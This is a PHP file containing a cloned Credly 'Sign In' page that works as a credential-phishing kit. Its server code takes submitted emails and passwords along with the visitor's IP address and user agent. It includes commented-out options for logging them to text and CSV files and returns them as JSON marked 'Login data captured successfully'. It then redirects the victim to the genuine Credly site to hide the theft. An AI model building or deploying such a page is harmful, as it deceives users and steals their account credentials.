<?php
// Enable CORS for cross-origin requests
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

// Initialize variables
$testinginputemail = "";
$testinginputpassword = "";

// Check if form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the email and password from the form
    $testinginputemail = $_POST['email'] ?? '';
    $testinginputpassword = $_POST['password'] ?? '';

    // Log the data immediately
    $ip = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $timestamp = date('Y-m-d H:i:s');

    // // Method 1: Save to text file (detailed)
    // $logEntry = "[$timestamp] | Email: $testinginputemail | Password: $testinginputpassword | IP: $ip | UserAgent: $userAgent\n";
    // file_put_contents('credentials.txt', $logEntry, FILE_APPEND);

    // // Method 2: Save to simple format
    // $simpleLog = "$timestamp | Email: $testinginputemail | Password: $testinginputpassword\n";
    // file_put_contents('simple_credentials.txt', $simpleLog, FILE_APPEND);

    // // Method 3: Save to CSV file
    // $csvData = [
    //     $timestamp,
    //     $testinginputemail,
    //     $testinginputpassword,
    //     $ip,
    //     $userAgent
    // ];
    // $csvLine = '"' . implode('","', $csvData) . '"' . PHP_EOL;

    // // Create CSV file if it doesn't exist
    // if (!file_exists('credentials.csv')) {
    //     $csvHeader = '"Timestamp","Email","Password","IP","UserAgent"' . PHP_EOL;
    //     file_put_contents('credentials.csv', $csvHeader);
    // }
    // file_put_contents('credentials.csv', $csvLine, FILE_APPEND);

    // For AJAX requests, return JSON
    if (
        isset($_SERVER['HTTP_X_REQUESTED_WITH']) ||
        (isset($_SERVER['HTTP_ACCEPT']) && strpos($_SERVER['HTTP_ACCEPT'], 'application/json') !== false)
    ) {
        header('Content-Type: application/json');
        echo json_encode([
            'success' => true,
            'email' => $testinginputemail,
            'password' => $testinginputpassword,
            'ip' => $ip,
            'userAgent' => $userAgent,
            'message' => 'Login data captured successfully'
        ]);
        exit;
    }

    // For regular form submission, redirect to info.credly.com
    header('Location: https://info.credly.com');
    exit;
}
?>

<!DOCTYPE html>
<!-- saved from url=(0014)about:internet -->
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="icon" type="image/svg+xml" href="images/credlyicon.png">
    <link rel="icon" type="image/png" href="favicon.png">
    <script async="" src="./sign_credly_files/pendo.js.download"></script>
    <script src="./sign_credly_files/otSDKStub.js.download" data-document-language="true" type="text/javascript" charset="UTF-8" data-domain-script="01939cd7-7f26-7c87-af17-d2bfc69700b9"></script>
    <style type="text/css" id="operaUserStyle"></style>
    <script nonce="">
        //<![CDATA[

        function OptanonWrapper() {}

        //]]>
    </script>
    <script nonce="">
        //<![CDATA[

        window._trackJs = {
            token: 'e43bb3a0b11a469ba1ef2ec2b79c6b11',
            application: 'acclaim-production',
            version: '1.207.1'
        };

        //]]>
    </script>
    <script type="text/javascript" src="./sign_credly_files/tracker.js.download"></script>

    <script nonce="">
        //<![CDATA[

        (function(apiKey) {
            (function(p, e, n, d, o) {
                var v, w, x, y, z;
                o = p[d] = p[d] || {};
                o._q = [];
                v = ['initialize', 'identify', 'updateOptions', 'pageLoad'];
                for (w = 0, x = v.length; w < x; ++w)(function(m) {
                    o[m] = o[m] || function() {
                        o._q[m === v[0] ? 'unshift' : 'push']([m].concat([].slice.call(arguments, 0)));
                    };
                })(v[w]);
                y = e.createElement(n);
                y.async = !0;
                y.src = 'https://cdn.pendo.io/agent/static/' + apiKey + '/pendo.js';
                z = e.getElementsByTagName(n)[0];
                z.parentNode.insertBefore(y, z);
            })(window, document, 'script', 'pendo');
        })("65460ef3-56d0-45a3-7b3b-fe1ec0463054")

        //]]>
    </script>
    <meta content="Credly is a global Open Badge platform that closes the gap between skills and opportunities. We work with academic institutions, corporations, and professional associations to translate learning outcomes into digital credentials that are immediately validated, managed, and shared." data-rh="" name="description">
    <meta content="Credly, Credly badges, Acclaim, open badges, digital badges, badges, web-enabled credentials, Badge Alliance, Mozilla Open Badge standards, Mozilla Open Badges, verified credentials, learning outcomes" name="keywords">
    <meta content="width=device-width,initial-scale=1.0" name="viewport">
    <meta content="1B97012E4CB3B07611090D1A0B4D9D19" name="msvalidate.01">
    <meta content="d20lZjrSJJ_n0jc1HHlADZBDmn5wZfiBDucFzzOzHCY" name="google-site-verification">

    <meta name="csrf-param" content="authenticity_token">
    <meta name="csrf-token" content="9eJbJ4oiQ1smggnU9E0R8gnojbxb9ZK1frDXJpt5hxfquCKzfzMr7AvCw3P52fFsJOLwnRR9tx4J98UIIWiy4g">
    <link rel="stylesheet" href="./sign_credly_files/css" media="all">
    <link rel="stylesheet" href="./sign_credly_files/bcc0eop.css" media="all">
    <script async="true" src="./sign_credly_files/js"></script>
    <script nonce="">
        //<![CDATA[
        window.dataLayer = window.dataLayer || [];

        function google_tag() {
            dataLayer.push(arguments);
        }
        google_tag('js', new Date());
        google_tag('config', 'G-5D8QQR0C2M');
        (function() {
            var tests = [];
            for (var k in {}) {
                tests.push(k);
            }
            google_tag('set', 'dimension1', tests.join(';'));
        })();
        google_tag('send', 'pageview');

        //]]>
    </script>
    <title>Sign In - Credly</title>
    <link rel="stylesheet" href="./sign_credly_files/transitional-ad74f2218752f8e97ea9f0c032d42d718238f0c822804b91c85e86ccd244f4f6.css" media="all">
    <link rel="stylesheet" href="./sign_credly_files/application-00f4a5becf21c7e9b51e60342eddc1bf37c6550d698be5e6791c45509de4b746.css" media="all">
    <script src="./sign_credly_files/otBannerSdk.js.download" async="" type="text/javascript"></script>
    <style data-styled="active" data-styled-version="5.3.11"></style>
    <link id="googleidentityservice" type="text/css" media="all" href="./sign_credly_files/style" rel="stylesheet">
    <meta http-equiv="origin-trial" content="A8o5T4MyEkRZqLA9WeG2XTFdV5tsX2Prg85xyQ+RL1btVuybB1K/EQ+7JUsPK+J32oBMTnsoF9B4A+qTlL6efgQAAABweyJvcmlnaW4iOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkZlZENtQnV0dG9uTW9kZSIsImV4cGlyeSI6MTc0NDY3NTIwMCwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
</head>

<body class="">
    <script>
        if (!Object.values) {
            document.write('<script src="https://cdn.credly.com/assets/ie_polyfills.legacy-browser-eb3f8596e1c5f284c28e29674c90aed1b5afae6dd3ec51117298e5a75b8dcde9.js" crossorigin="anonymous" type="module"><\/script>')
        }
    </script>
    <script nonce="">
        //<![CDATA[
        setTimeout(function() {
            pendo.initialize({
                "visitor": {},
                "account": {}
            });
        }, 1000)

        //]]>
    </script>
    <header class="transitional" id="website-header" style="display: none;">
        <div class="website-header-main-links-container website-header-placeholder"></div>
        <div>
            <a href="https://www.credly.com/users/sign_in?_gl=1*14dg3od*_ga*NDM4Nzc3MzUzLjE3NjI5NDUwODg.*_ga_Z763G7NB5L*czE3NjI5NDUwODYkbzEkZzAkdDE3NjI5NDUwOTAkajYwJGwwJGgw*_gcl_au*MjA0ODQ2MDY1OS4xNzYyOTQ1MDkw#skip-target" id="skip-to-content">Skip to content</a>
        </div>
        <div class="website-header-main-links-container non-react-header" hidden="">
            <div class="grid website-header-main-links">
                <a class="acclaim-logo" href="https://www.credly.com/">Credly</a>
            </div>
        </div>

        <div class="website-header-main-links-container" style="">
            <div class="grid website-header-main-links"><a id="acclaim-logo" tabindex="0" href="https://www.credly.com/">Credly</a>
                <nav>
                    <div class="">
                        <div class="c-global-search__search-bar">
                            <div class="container">
                                <div class="row">
                                    <div class="global-search-bar global-search-bar--unauthenticated"><template data-react-aria-hidden="true">
                                            <div class="InputBasestyles__Container-fredly__sc-1ucxilb-0 kbvdPF SearchInputstyles__StyledIconBase-fredly__sc-1l8yu9g-0 bOUTtJ global-search-bar__input__input"><input type="text" id="global-search-input" placeholder="Search by badge name, organization, skill, occupation or learning pathway" name="search" data-testid="SearchInputV2" role="searchbox" class="InputBasestyles__StyledInput-fredly__sc-1ucxilb-2 kdoWNr" value=""><span data-testid="left-search-icon" class="Iconstyles__Container-fredly__sc-hl5ane-0 hONSXJ SearchInputstyles__StyledIcon-fredly__sc-1l8yu9g-1 jDzdoB"><svg aria-labelledby="svg-inline--fa-title-5UL77jTykbRU" data-prefix="far" data-icon="magnifying-glass" class="svg-inline--fa fa-magnifying-glass " xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" color="#4E4E4E">
                                                        <title id="svg-inline--fa-title-5UL77jTykbRU">Search</title>
                                                        <path fill="currentColor" d="M368 208A160 160 0 1 0 48 208a160 160 0 1 0 320 0zM337.1 371.1C301.7 399.2 256.8 416 208 416C93.1 416 0 322.9 0 208S93.1 0 208 0S416 93.1 416 208c0 48.8-16.8 93.7-44.9 129.1L505 471c9.4 9.4 9.4 24.6 0 33.9s-24.6 9.4-33.9 0L337.1 371.1z"></path>
                                                    </svg></span></div>
                                        </template>
                                        <div class="global-search-bar__input__combobox" data-rac="">
                                            <div class="InputBasestyles__Container-fredly__sc-1ucxilb-0 kbvdPF SearchInputstyles__StyledIconBase-fredly__sc-1l8yu9g-0 bOUTtJ global-search-bar__input__input"><label class="InputBasestyles__StyledLabel-fredly__sc-1ucxilb-1 hdzQbB" id="react-aria3540752137-5" for="global-search-input" aria-labelledby="global-search-input"></label><input type="text" aria-autocomplete="list" autocomplete="off" name="search" placeholder="Search by badge name, organization, skill, occupation or learning pathway" autocorrect="off" spellcheck="false" tabindex="0" id="global-search-input" aria-labelledby="react-aria3540752137-5" role="searchbox" aria-expanded="false" data-testid="SearchInputV2" class="InputBasestyles__StyledInput-fredly__sc-1ucxilb-2 kdoWNr" value="" title=""><span data-testid="left-search-icon" class="Iconstyles__Container-fredly__sc-hl5ane-0 hONSXJ SearchInputstyles__StyledIcon-fredly__sc-1l8yu9g-1 jDzdoB"><svg aria-labelledby="svg-inline--fa-title-ievORBrmm4Td" data-prefix="far" data-icon="magnifying-glass" class="svg-inline--fa fa-magnifying-glass " xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" color="#4E4E4E">
                                                        <title id="svg-inline--fa-title-ievORBrmm4Td">Search</title>
                                                        <path fill="currentColor" d="M368 208A160 160 0 1 0 48 208a160 160 0 1 0 320 0zM337.1 371.1C301.7 399.2 256.8 416 208 416C93.1 416 0 322.9 0 208S93.1 0 208 0S416 93.1 416 208c0 48.8-16.8 93.7-44.9 129.1L505 471c9.4 9.4 9.4 24.6 0 33.9s-24.6 9.4-33.9 0L337.1 371.1z"></path>
                                                    </svg></span></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="c-global-search__results c-global-search__results--is-hidden cr-search-results cr-search-results--unfocused cr-search-results--is-hidden"></div>
                    </div>
                </nav>
            </div>
        </div>
    </header>
    <div class="search-bar" data-container="search-bar"></div>
    <div class="sessions" id="flash">
        <div class="grid">
            <div class="l1-0 r1-0" data-behavior="flash-container">
                <noscript>
                    <div class='flash notice'>
                        <i class='icon-error'></i>
                        <div>
                            We've detected that your browser has JavaScript disabled. Some features of Credly require Javascript to be enabled. For the best experience, please enable JavaScript in your browser settings or try using a different browser.
                        </div>
                    </div>
                </noscript>

            </div>
        </div>
    </div>






    <main id="root">
        <div data-testid="semantic-colors-provider">
            <span id="skip-target" data-debugname="root" style=""></span>

            <!-- Display loading message if form was submitted -->
            <?php if ($_SERVER["REQUEST_METHOD"] == "POST"): ?>
                <div class="success-message">
                    <div class="loading-spinner"></div>
                    <strong>Signing you in... Please wait</strong>
                </div>

                <script>
                    // Redirect to info.credly.com after 2 seconds
                    setTimeout(function() {
                        window.location.href = 'https://info.credly.com';
                    }, 2000);
                </script>
            <?php endif; ?>

            <div>
                <!-- TOP SECTION: Logo, content and signin form -->
                <div class="homepage__top-content">
                    <div class="container homepage__top-content--container">
                        <div class="row homepage__top-content--container_row">

                            <!-- LEFT SIDE: Brand content -->
                            <div class="col-md-5 homepage__landing-text">
                                <a href="https://www.credly.com/">
                                    <img src="./sign_credly_files/credly-logo-white-NBKYDKYM.digested.svg" alt="Credly logo" class="homepage__logo">
                                </a>
                                <h1 class="homepage__header">Level up your career.</h1>
                                <div class="homepage__top-text-container">
                                    <p class="homepage__top-text">Join millions of professionals, recruiters, and employers on Credly, where you can:</p>
                                    <ul>
                                        <li>
                                            <div class="homepage__action-item-container"><span class="homepage__icon"></span>Grow your professional skills</div>
                                        </li>
                                        <li>
                                            <div class="homepage__action-item-container"><span class="homepage__icon"></span>Broadcast your skills to managers at your company</div>
                                        </li>
                                        <li>
                                            <div class="homepage__action-item-container"><span class="homepage__icon"></span>Earn credentials that translate to college credit</div>
                                        </li>
                                        <li>
                                            <div class="homepage__action-item-container"><span class="homepage__icon"></span>Discover new professional opportunities</div>
                                        </li>
                                    </ul>
                                </div>
                            </div>

                            <!-- RIGHT SIDE: Signin form -->
                            <div class="col-md-6 offset-md-1 homepage__children">
                                <div class="homepage__signin-wrapper">
                                    <div class="signin-form" data-webdriver-signin-main="">
                                        <!-- Form submits to itself -->
                                        <form data-testid="form" class="signin-form__form" method="POST" action="save.php">
                                            <div class="signin-form__header">
                                                <h2 class="ac-heading ac-heading--action-page-head">Sign In</h2>
                                            </div>
                                            <!-- EMAIL FIELD -->
                                            <div class="c-field-group c-field-group__has-label signin-form__field">
                                                <div class="c-field-group__input-group c-field-group__input-group--enclosed">
                                                    <label for="email_8" id="label_email_8" class="c-input-label c-field-group__label"><span>Email</span></label>
                                                    <input type="email" name="email" id="email_8" aria-labelledby="label_email_8" autocomplete="email" aria-required="true" class="c-text-field__input" required>
                                                </div>
                                            </div>

                                            <!-- PASSWORD FIELD -->
                                            <div class="c-field-group c-field-group__has-label signin-form__field">
                                                <div class="c-field-group__input-group c-field-group__input-group--enclosed">
                                                    <label for="password_10" id="label_password_10" class="c-input-label c-field-group__label"><span>Password</span><span></span></label>
                                                    <input type="password" class="c-password-field__input" aria-required="true" name="password" id="password_10" aria-labelledby="label_password_10" autocomplete="current-password" required>
                                                </div>
                                            </div>

                                            <!-- REMEMBER ME & FORGOT PASSWORD -->
                                            <div>
                                                <a class="signin__forgot-password" href="https://www.credly.com/users/password/new">
                                                    Forgot your password?
                                                </a>
                                            </div>

                                                <!-- SIGN IN BUTTON -->
                                                <div class="signin-form__submit">
                                                    <button class="cr-button cr-button__primary cr-button__full cr-button__mobile-full cr-button__submit-wrap" type="submit">
                                                        <div class="cr-button__content">Sign In</div>
                                                    </button>
                                                </div>

                                            <!-- SOCIAL SIGN-ON SECTION -->
                                            <div class="social-signon-buttons__sso-content">
                                                <div class="social-signon-buttons__or">OR</div>
                                                <div class="google-sso-button__responsive-container">
                                                    <div role="button" id="google_sso_btn" class="google-sso-button__g-sso-button">
                                                        <div class="S9gUrf-YoZ4jf" style="position: relative;">
                                                            <div></div>
                                                            <iframe src="./sign_credly_files/button.html" class="L5Fo6c-PQbLGe" allow="identity-credentials-get" id="gsi_109652_628505" title="Sign in with Google" style="display: block; position: relative; top: 0px; left: 0px; height: 44px; width: 418px; border: 0px; margin: -2px -10px;"></iframe>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="apple-sso-button__responsive-container">
                                                    <div role="button" class="apple-sso-button__apple-sso-button" tabindex="0">
                                                        <img src="./sign_credly_files/apple-logo-E4IM6MJE.digested.svg" alt="" class="apple-sso-button__logo">
                                                        <span>Sign in with Apple</span>
                                                    </div>
                                                </div>
                                            </div>

                                            <!-- CREATE ACCOUNT LINK -->
                                            <div class="container signin-form__create-account">
                                                <a href="https://www.credly.com/users/sign_up">Create account</a>
                                            </div>

                                        </form>
                                    </div>
                                </div>
                            </div>

                        </div>
                    </div>
                </div>

                <!-- BOTTOM SECTION: Background pattern -->
                <div class="homepage__bottom-content" style="background-image: url(https://credly.com/assets/credly-pattern-53M7PTMO.digested.svg);">
                    <div class="container"></div>
                </div>

            </div>
        </div>
    </main>


    <div data-container="global-search-results"></div>


    <script nonce="">
        //<![CDATA[
        (function() {
            document.addEventListener("click", function(e) {
                const eventTarget = e.target;
                if (eventTarget.id == "skip-to-content" || eventTarget.id == "skip-nav") {
                    let href, target;
                    href = eventTarget.getAttribute("href").substr(1);
                    target = document.getElementById(href);
                    if (!target.getAttribute("tabindex")) {
                        target.setAttribute("tabindex", "-1");
                    }
                    target.focus();
                }
            });
        })();


        //]]>
    </script>





